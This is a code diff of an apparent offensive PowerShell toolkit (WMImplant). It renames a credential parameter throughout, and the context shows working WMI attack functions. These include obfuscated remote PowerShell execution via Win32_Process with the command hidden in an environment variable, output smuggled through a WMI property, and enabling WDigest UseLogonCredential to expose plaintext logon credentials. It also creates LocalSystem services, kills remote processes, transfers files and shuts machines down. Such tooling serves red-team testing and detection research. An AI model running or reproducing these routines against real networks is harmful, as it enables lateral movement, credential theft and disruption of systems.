@@ -9,7 +9,7 @@ function Invoke-WMIObfuscatedPSCommand
     param
     (
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [String]$PSCommand,
         [Parameter(Mandatory = $True)]
@@ -52,10 +52,10 @@ function Invoke-WMIObfuscatedPSCommand
         # Set final PowerShell command to be executed by WMI.
         $ObfuscatedCommand = "powershell $PSCommandForCommandLine"
 
-        # Extract username if $Creds were specified. Otherwise use current username.
-        if($Creds)
+        # Extract username if $Credential were specified. Otherwise use current username.
+        if($Credential)
         {
-            $Username = $Creds.UserName
+            $Username = $Credential.UserName
         }
         else
         {
@@ -65,9 +65,9 @@ function Invoke-WMIObfuscatedPSCommand
         # Set PowerShell command in an environment variable if $ObfuscateWithEnvVar flag was defined.
         if($ObfuscateWithEnvVar)
         {
-            if($Creds)
+            if($Credential)
             {
-                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $ComputerName -Credential $Creds
+                $null = Set-WmiInstance -Class Win32_Environment -Argument @{Name=$VarName;VariableValue=$PSCommand;UserName=$Username} -ComputerName $ComputerName -Credential $Credential
             }
             else
             {
@@ -76,9 +76,9 @@ function Invoke-WMIObfuscatedPSCommand
         }
 
         # Launch PowerShell command.
-        if($Creds)
+        if($Credential)
         {
-            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -Credential $Creds -ComputerName $ComputerName
+            $null = Invoke-WmiMethod -Class Win32_Process -EnableAllPrivileges -Impersonation 3 -Authentication Packetprivacy -Name Create -Argumentlist $ObfuscatedCommand -Credential $Credential -ComputerName $ComputerName
         }
         else
         {
@@ -88,9 +88,9 @@ function Invoke-WMIObfuscatedPSCommand
         # Delete environment variable containing PowerShell command if $ObfuscateWithEnvVar flag was defined.
         if($ObfuscateWithEnvVar)
         {
-            if($Creds)
+            if($Credential)
             {
-                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $ComputerName -Credential $Creds | Remove-WmiObject
+                $null = Get-WmiObject -Query "SELECT * FROM Win32_Environment WHERE NAME='$VarName'" -ComputerName $ComputerName -Credential $Credential | Remove-WmiObject
             }
             else
             {
@@ -123,7 +123,7 @@ function Find-CurrentUsers
     param
     (
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName
     )
@@ -154,7 +154,7 @@ function Find-VacantComputer
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName
     )
@@ -214,7 +214,7 @@ function Get-ComputerDrives
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName
     )
@@ -235,7 +235,7 @@ function Get-HostInfo
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName
     )
@@ -266,7 +266,7 @@ function Get-InstalledPrograms
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName
     )
@@ -334,7 +334,7 @@ function Get-NetworkCards
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $False)]
         [string]$ComputerName
     )
@@ -361,7 +361,7 @@ function Get-ProcessListingWMImplant
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $False)] 
         [string]$ComputerName
     )
@@ -399,7 +399,7 @@ Path to save output to
     (
         # Parameter Assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False)]
@@ -410,9 +410,9 @@ Path to save output to
 
         Write-Verbose "Connecting to $ComputerName"
 
-        if($Creds)
+        if($Credential)
         {
-            $results = Get-WmiObject -Credential $Creds -ComputerName $ComputerName -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
+            $results = Get-WmiObject -Credential $Credential -ComputerName $ComputerName -query "SELECT * FROM Win32_NTLogEvent WHERE (logfile='security') AND (EventCode='4624')" | where { $_.Message | Select-String "Logon Type:\s+(2|10)" | Select-String "Logon Process:\s+User32"}
         }
 
         else
@@ -454,7 +454,7 @@ function Invoke-CommandExecution
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False)]
@@ -469,9 +469,9 @@ function Invoke-CommandExecution
         }
 
         # Get original WMI Property
-        if($Creds)
+        if($Credential)
         {
-            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds).DebugFilePath
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential).DebugFilePath
         }
         else
         {
@@ -487,9 +487,9 @@ function Invoke-CommandExecution
 
         Write-Verbose "Running command on remote system..."
 
-        if($Creds)
+        if($Credential)
         {
-            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Creds $creds -ObfuscateWithEnvVar
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
         }
         else
         {
@@ -502,9 +502,9 @@ function Invoke-CommandExecution
         while($quit -eq $false)
         {
             Write-Verbose "Polling property to see if the script has completed"
-            if($Creds)
+            if($Credential)
             {
-                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
             }
             else
             {
@@ -895,7 +895,7 @@ function Invoke-ProcessPunisher
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False)] 
@@ -931,9 +931,9 @@ function Invoke-ProcessPunisher
         {
             Write-Verbose "Killing process via process name"
 
-            if($Creds)
+            if($Credential)
             {
-                Get-WmiObject -Class win32_Process -Credential $Creds -Computername $ComputerName -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
+                Get-WmiObject -Class win32_Process -Credential $Credential -Computername $ComputerName -Filter "name = '$PName'" | ForEach-Object { $_.Terminate() }
             }
             else
             {
@@ -945,9 +945,9 @@ function Invoke-ProcessPunisher
         {
             Write-Verbose "Killing process via process ID"
 
-            if($Creds)
+            if($Credential)
             {
-                Get-WmiObject -Class win32_Process -Credential $Creds -Computername $ComputerName -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
+                Get-WmiObject -Class win32_Process -Credential $Credential -Computername $ComputerName -Filter "ProcessID = '$ProcId'" | ForEach-Object { $_.Terminate() }
             }
             else
             {
@@ -965,7 +965,7 @@ function Invoke-PowerOptionsWMI
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False, ParameterSetName='shutdown')] 
@@ -1017,9 +1017,9 @@ function Invoke-PowerOptionsWMI
 
         Write-Verbose "Connecting to $ComputerName"
 
-        if($Creds)
+        if($Credential)
         {
-            (gwmi win32_operatingsystem -Credential $Creds -ComputerName $ComputerName).Win32Shutdown($power_option)
+            (gwmi win32_operatingsystem -Credential $Credential -ComputerName $ComputerName).Win32Shutdown($power_option)
         }
         else
         {
@@ -1037,7 +1037,7 @@ function Invoke-ProcSpawn
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False)] 
@@ -1053,9 +1053,9 @@ function Invoke-ProcSpawn
             $Command = $Command.Trim()
         }
 
-        if($Creds)
+        if($Credential)
         {
-            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $Creds -Computername $ComputerName
+            Invoke-WmiMethod -class win32_process -name create -Argumentlist $Command -Credential $Credential -Computername $ComputerName
         }
 
         else
@@ -1075,7 +1075,7 @@ function Invoke-RegValueMod
     (
         #Parameter assignment
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False)] 
@@ -1206,15 +1206,15 @@ function Invoke-RegValueMod
                 $RegValue = Read-Host "What's the data you'd like for the registry value being modified? >"
             }
 
-            if($Creds)
+            if($Credential)
             {
                 if($RegSubKey -eq "UseLogonCredential" -or $RegSubKey -eq "AllowAutoConfig") 
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $ComputerName -Credential $Creds
+                    Invoke-WmiMethod -Class StdRegProv -Name SetDWORDValue -ArgumentList @($hivevalue, $RegKey, $RegSubKey, 1) -ComputerName $ComputerName -Credential $Credential
                 }
                 else
                 {
-                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $ComputerName -Credential $Creds
+                    Invoke-WmiMethod -Class StdRegProv -Name SetStringValue -ArgmuentList $hivevalue, $RegKey, $RegValue, $RegSubKey -ComputerName $ComputerName -Credential $Credential
                 }
             }
 
@@ -1233,9 +1233,9 @@ function Invoke-RegValueMod
 
         elseif($KeyDelete)
         {
-            if($Creds)
+            if($Credential)
             {
-                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $ComputerName -Credential $Creds
+                Invoke-WmiMethod -Class StdRegProv -Name DeleteValue -ArgumentList $hivevalue, $RegKey, $RegSubKey -ComputerName $ComputerName -Credential $Credential
             }
 
             else
@@ -1254,7 +1254,7 @@ function Invoke-RemoteScriptWithOutput
     param
     (
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False)] 
@@ -1278,9 +1278,9 @@ function Invoke-RemoteScriptWithOutput
         }
 
         # Saving original WMI Property value
-        if($Creds)
+        if($Credential)
         {
-            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds).DebugFilePath
+            $Original_WMIProperty = (Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential).DebugFilePath
         }
         else
         {
@@ -1291,9 +1291,9 @@ function Invoke-RemoteScriptWithOutput
         $script_to_run = Get-Content -Encoding byte -Path $Location
         $encoded_script = [Int[]][Char[]]$script_to_run -Join ','
 
-        if($Creds)
+        if($Credential)
         {
-            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds
+            $modify_wmi_prop = Get-WmiObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
         }
         else
         {
@@ -1312,9 +1312,9 @@ function Invoke-RemoteScriptWithOutput
 
         Write-Verbose "Running command on remote system..."
 
-        if($Creds)
+        if($Credential)
         {
-            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Creds $Creds -ObfuscateWithEnvVar
+            Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -ComputerName $ComputerName -Credential $Credential -ObfuscateWithEnvVar
         }
         else
         {
@@ -1327,9 +1327,9 @@ function Invoke-RemoteScriptWithOutput
         while($quit -eq $false)
         {
             Write-Verbose "Polling property to see if the script has completed"
-            if($Creds)
+            if($Credential)
             {
-                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Creds
+                $modified_WMIObject = Get-WMIObject -Class Win32_OSRecoveryConfiguration -ComputerName $ComputerName -Credential $Credential
             }
             else
             {
@@ -1375,7 +1375,7 @@ function Invoke-ServiceMod
     param
     (
         [Parameter(Mandatory = $False)]
-        [System.Management.Automation.PSCredential]$Creds,
+        [System.Management.Automation.PSCredential]$Credential,
         [Parameter(Mandatory = $True)]
         [string]$ComputerName,
         [Parameter(Mandatory = $False)]
@@ -1435,9 +1435,9 @@ function Invoke-ServiceMod
 
             $filter = "name='$Service'"
 
-            if($Creds)
+            if($Credential)
             {
-                $SystemService = Get-WmiObject -class win32_service -ComputerName $ComputerName -Filter $filter -Credential $Creds
+                $SystemService = Get-WmiObject -class win32_service -ComputerName $ComputerName -Filter $filter -Credential $Credential
             }
             else
             {
@@ -1472,9 +1472,9 @@ function Invoke-ServiceMod
 
             $args = $false,$NewServiceName,0,$null,$null,$NewServiceName,$NewServicePath,$null,16,"Automatic","LocalSystem",$null
             
-            if($Creds)
+            if($Credential)
             {
-                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $ComputerName -Credential $Creds
+                Invoke-WmiMethod -path Win32_Service -Name create -argumentlist $args -ComputerName $ComputerName -Credential $Credential
             }
             else
             {
@@ -1890,7 +1890,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Get-FileContentsWMImplant -Creds $RemoteCredential -ComputerName $Computer -File $RemoteFile
+                    Get-FileContentsWMImplant -Credential $RemoteCredential -ComputerName $Computer -File $RemoteFile
                 }
 
                 else
@@ -1916,7 +1916,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-FileTransferWMImplant -Creds $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -ComputerName $Computer
+                    Invoke-FileTransferWMImplant -Credential $RemoteCredential -Download -DownloadFile $RemoteFile -DownloadFilePath $LocalFile -ComputerName $Computer
                 }
 
                 else
@@ -1937,7 +1937,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-LSWMImplant -Creds $RemoteCredential -ComputerName $Computer -Directory $RemoteDirectory
+                    Invoke-LSWMImplant -Credential $RemoteCredential -ComputerName $Computer -Directory $RemoteDirectory
                 }
 
                 else
@@ -1965,11 +1965,11 @@ function Invoke-WMImplant
                 {
                     if($RemoteFile)
                     {
-                        Find-FileWMImplant -Creds $RemoteCredential -File $RemoteFile -ComputerName $Computer -Drive $RemoteDrive
+                        Find-FileWMImplant -Credential $RemoteCredential -File $RemoteFile -ComputerName $Computer -Drive $RemoteDrive
                     }
                     elseif($RemoteExtension)
                     {
-                        Find-FileWMImplant -Creds $RemoteCredential -Extension $RemoteExtension -ComputerName $Computer -Drive $RemoteDrive
+                        Find-FileWMImplant -Credential $RemoteCredential -Extension $RemoteExtension -ComputerName $Computer -Drive $RemoteDrive
                     }
                 }
 
@@ -2003,7 +2003,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-FileTransferWMImplant -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -ComputerName $Computer
+                    Invoke-FileTransferWMImplant -Credential $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -ComputerName $Computer
                 }
 
                 else
@@ -2024,7 +2024,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-CommandExecution -Creds $RemoteCredential -ExecCommand $RemoteCommand -ComputerName $Computer
+                    Invoke-CommandExecution -Credential $RemoteCredential -ExecCommand $RemoteCommand -ComputerName $Computer
                 }
 
                 else
@@ -2040,7 +2040,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RegValueMod -Creds $RemoteCredential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -ComputerName $Computer
+                    Invoke-RegValueMod -Credential $RemoteCredential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -ComputerName $Computer
                 }
 
                 else
@@ -2056,7 +2056,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ProcSpawn -Creds $RemoteCredential -ComputerName $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
+                    Invoke-ProcSpawn -Credential $RemoteCredential -ComputerName $Computer -Command 'powershell.exe -command "Disable-PSRemoting -Force"'
                 }
 
                 else
@@ -2072,7 +2072,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RegValueMod -Creds $RemoteCredential -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -ComputerName $Computer
+                    Invoke-RegValueMod -Credential $RemoteCredential -KeyCreate -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue 1 -ComputerName $Computer
                 }
 
                 else
@@ -2088,7 +2088,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ProcSpawn -Creds $RemoteCredential -ComputerName $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
+                    Invoke-ProcSpawn -Credential $RemoteCredential -ComputerName $Computer -Command 'powershell.exe -command "Enable-PSRemoting -Force"'
                 }
 
                 else
@@ -2124,7 +2124,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RegValueMod -ComputerName $Computer -Creds $RemoteCredential -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
+                    Invoke-RegValueMod -ComputerName $Computer -Credential $RemoteCredential -KeyCreate -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey -RegValue $RegValue
                 }
                 else
                 {
@@ -2154,7 +2154,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RegValueMod -ComputerName $Computer -Creds $RemoteCredential -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
+                    Invoke-RegValueMod -ComputerName $Computer -Credential $RemoteCredential -KeyDelete -RegHive $RegHive -RegKey $RegKey -RegSubKey $RegSubKey
                 }
                 else
                 {
@@ -2179,7 +2179,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-RemoteScriptWithOutput -Creds $RemoteCredential -Location $Location -Function $Function -ComputerName $Computer
+                    Invoke-RemoteScriptWithOutput -Credential $RemoteCredential -Location $Location -Function $Function -ComputerName $Computer
                 }
 
                 else
@@ -2200,7 +2200,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ServiceMod -Creds $RemoteCredential -ComputerName $Computer -Service $ServiceName -Start
+                    Invoke-ServiceMod -Credential $RemoteCredential -ComputerName $Computer -Service $ServiceName -Start
                 }
                 else
                 {
@@ -2220,7 +2220,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ServiceMod -Creds $RemoteCredential -ComputerName $Computer -Service $ServiceName -Stop
+                    Invoke-ServiceMod -Credential $RemoteCredential -ComputerName $Computer -Service $ServiceName -Stop
                 }
                 else
                 {
@@ -2240,7 +2240,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ServiceMod -Creds $RemoteCredential -ComputerName $Computer -Service $ServiceName -Delete
+                    Invoke-ServiceMod -Credential $RemoteCredential -ComputerName $Computer -Service $ServiceName -Delete
                 }
                 else
                 {
@@ -2265,7 +2265,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ServiceMod -Creds $RemoteCredential -ComputerName $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
+                    Invoke-ServiceMod -Credential $RemoteCredential -ComputerName $Computer -NewServiceName $ServiceName -NewServicePath $RemoteFile -Create
                 }
                 else
                 {
@@ -2281,7 +2281,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Set-OriginalProperty -Creds $RemoteCredential -ComputerName $Computer
+                    Set-OriginalProperty -Credential $RemoteCredential -ComputerName $Computer
                 }
 
                 else
@@ -2297,7 +2297,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Get-ProcessListingWMImplant -Creds $RemoteCredential -ComputerName $Computer
+                    Get-ProcessListingWMImplant -Credential $RemoteCredential -ComputerName $Computer
                 }
 
                 else
@@ -2321,12 +2321,12 @@ function Invoke-WMImplant
                 {
                     if($ProcessName)
                     {
-                        Invoke-ProcessPunisher -Creds $RemoteCredential -ComputerName $Computer -PName $ProcessName
+                        Invoke-ProcessPunisher -Credential $RemoteCredential -ComputerName $Computer -PName $ProcessName
                     }
 
                     elseif($ProcessID)
                     {
-                        Invoke-ProcessPunisher -Creds $RemoteCredential -ComputerName $Computer -ProcId $ProcessID
+                        Invoke-ProcessPunisher -Credential $RemoteCredential -ComputerName $Computer -ProcId $ProcessID
                     }
                 }
 
@@ -2356,7 +2356,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-ProcSpawn -Creds $RemoteCredential -ComputerName $Computer -Command $RemoteFile
+                    Invoke-ProcSpawn -Credential $RemoteCredential -ComputerName $Computer -Command $RemoteFile
                 }
 
                 else
@@ -2372,7 +2372,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Find-CurrentUsers -Creds $RemoteCredential -ComputerName $Computer
+                    Find-CurrentUsers -Credential $RemoteCredential -ComputerName $Computer
                 }
 
                 else
@@ -2388,7 +2388,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Get-HostInfo -Creds $RemoteCredential -ComputerName $Computer
+                    Get-HostInfo -Credential $RemoteCredential -ComputerName $Computer
                 }
 
                 else
@@ -2404,7 +2404,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Get-ComputerDrives -Creds $RemoteCredential -ComputerName $Computer
+                    Get-ComputerDrives -Credential $RemoteCredential -ComputerName $Computer
                 }
 
                 else
@@ -2420,7 +2420,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Get-NetworkCards -Creds $RemoteCredential -ComputerName $Computer
+                    Get-NetworkCards -Credential $RemoteCredential -ComputerName $Computer
                 }
 
                 else
@@ -2436,7 +2436,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Get-InstalledPrograms -Creds $RemoteCredential -ComputerName $Computer
+                    Get-InstalledPrograms -Credential $RemoteCredential -ComputerName $Computer
                 }
 
                 else
@@ -2452,7 +2452,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Find-VacantComputer -Creds $RemoteCredential -ComputerName $Computer
+                    Find-VacantComputer -Credential $RemoteCredential -ComputerName $Computer
                 }
 
                 else
@@ -2470,7 +2470,7 @@ function Invoke-WMImplant
                 {
                     if($RemoteCredential)
                     {
-                        Get-WMIEventLogins -Creds $RemoteCredential -ComputerName $Computer -FileName $LocalFile
+                        Get-WMIEventLogins -Credential $RemoteCredential -ComputerName $Computer -FileName $LocalFile
                     }
 
                     else
@@ -2483,7 +2483,7 @@ function Invoke-WMImplant
                 {
                     if($RemoteCredential)
                     {
-                        Get-WMIEventLogins -Creds $RemoteCredential -ComputerName $Computer
+                        Get-WMIEventLogins -Credential $RemoteCredential -ComputerName $Computer
                     }
 
                     else
@@ -2500,7 +2500,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -ComputerName $Computer -Logoff
+                    Invoke-PowerOptionsWMI -Credential $RemoteCredential -ComputerName $Computer -Logoff
                 }
 
                 else
@@ -2516,7 +2516,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -ComputerName $Computer -Reboot
+                    Invoke-PowerOptionsWMI -Credential $RemoteCredential -ComputerName $Computer -Reboot
                 }
 
                 else
@@ -2532,7 +2532,7 @@ function Invoke-WMImplant
             {
                 if($RemoteCredential)
                 {
-                    Invoke-PowerOptionsWMI -Creds $RemoteCredential -ComputerName $Computer -Shutdown
+                    Invoke-PowerOptionsWMI -Credential $RemoteCredential -ComputerName $Computer -Shutdown
                 }
 
                 else
@@ -2676,7 +2676,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Set-OriginalProperty -Creds $Credential -ComputerName $ComputerName
+                    Set-OriginalProperty -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2694,7 +2694,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Get-FileContentsWMImplant -Creds $Credential -ComputerName $ComputerName
+                    Get-FileContentsWMImplant -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2707,7 +2707,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-FileTransferWMImplant -Creds $Credential -Download -ComputerName $ComputerName
+                    Invoke-FileTransferWMImplant -Credential $Credential -Download -ComputerName $ComputerName
                 }
 
                 else
@@ -2720,7 +2720,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-LSWMImplant -Creds $Credential -ComputerName $ComputerName
+                    Invoke-LSWMImplant -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2733,7 +2733,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Find-FileWMImplant -Creds $Credential -ComputerName $ComputerName
+                    Find-FileWMImplant -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2747,7 +2747,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-FileTransferWMImplant -Creds $Credential -Upload -ComputerName $ComputerName
+                    Invoke-FileTransferWMImplant -Credential $Credential -Upload -ComputerName $ComputerName
                 }
 
                 else
@@ -2760,7 +2760,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-CommandExecution -Creds $Credential -ComputerName $ComputerName
+                    Invoke-CommandExecution -Credential $Credential -ComputerName $ComputerName
                 }
 
                 else
@@ -2773,7 +2773,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-RegValueMod -Creds $Credential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -ComputerName $ComputerName
+                    Invoke-RegValueMod -Credential $Credential -KeyDelete -RegHive hklm -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -ComputerName $ComputerName
                 }
 
                 else
@@ -2786,7 +2786,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-ProcSpawn -Creds $Credential -Command 'powershell.exe -command "Disable-PSRemoting -Force"' -ComputerName $ComputerName
+                    Invoke-ProcSpawn -Credential $Credential -Command 'powershell.exe -command "Disable-PSRemoting -Force"' -ComputerName $ComputerName
                 }
 
                 else
@@ -2799,7 +2799,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-RegValueMod -Creds $Credential -KeyCreate -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue '0x1' -ComputerName $ComputerName
+                    Invoke-RegValueMod -Credential $Credential -KeyCreate -RegHive 'hklm' -RegKey 'SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -RegSubKey 'UseLogonCredential' -RegValue '0x1' -ComputerName $ComputerName
                 }
 
                 else
@@ -2812,7 +2812,7 @@ function Use-MenuSelection
             {
                 if ($Credential)
                 {
-                    Invoke-ProcSpawn -Creds $Credential -Command 'powershell.exe -command "Enable-PSRemoting -Force"' -ComputerName $ComputerName
+                    Invoke-ProcSpawn -Credential $Credential -Command 'powershell.exe -command "Enable-PSRemoting -Force"' -ComputerName $ComputerName
                 }
 
                 else
@@ -2825,7 +2825,7 @@ function Use-MenuSelection
             {
                 if($Credential)
                 {
-                    Invoke-RegValueMod -Creds $Credential -ComputerName $ComputerName
